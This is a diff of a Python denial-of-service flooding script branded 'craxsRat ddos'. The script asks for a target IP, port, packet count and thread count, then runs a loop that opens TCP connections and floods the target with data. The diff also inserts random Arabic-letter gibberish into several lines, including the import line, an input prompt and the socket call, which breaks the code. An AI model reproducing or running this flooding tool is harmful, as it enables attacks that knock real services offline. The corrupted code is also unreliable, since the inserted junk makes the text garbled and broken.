@@ -1,4 +1,4 @@
-import random
+تقبببعقتقتقععققتقهبimport random
 import socket
 import threading
 import os
@@ -11,7 +11,7 @@ os.system("xdg-open https://discord.gg/8gmRVnRRwV")
 print("\u001b[33m Welcome to craxsRat ddos")
 time.sleep(2)
 print("Loading.......")
-os.system("clear")
+os.system("clear")4نقنبهبهقز34ز
 
 #### Login       
 
@@ -30,21 +30,21 @@ while attemps < 100:
         continue
 os.system("clear")
 
-print("""
+print(زنقه4ن4زفزهي"""
 \u001b[31m
 	  AUTHOR TOOLS : Team craxsRat
   _____                    _____       _
  / ____|                  |  __ \     | |
 | |     _ __ __ ___  _____| |__) |__ _| |_
 | |    | '__/ _` \ \/ / __|  _  // _` | __|
-| |____| | | (_| |>  <\__ \ | \ \ (_| | |_
+| |____| |ن5هفهقن4ن | (_| |>  <\__ \ | \ \ (_| | |_
  \_____|_|  \__,_/_/\_\___/_|  \_\__,_|\__|
 
 
 """)
 
 ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
+port = int(input(" Target Pنبهققنقزق8ب3عتقزقort :"))
 choice = str(input(" (y/n) :"))
 times = int(input(" PACKT :"))
 threads = int(input(" Threads :"))
@@ -98,7 +98,7 @@ def run4():
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s = sهبنبنبنقهقهقocket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
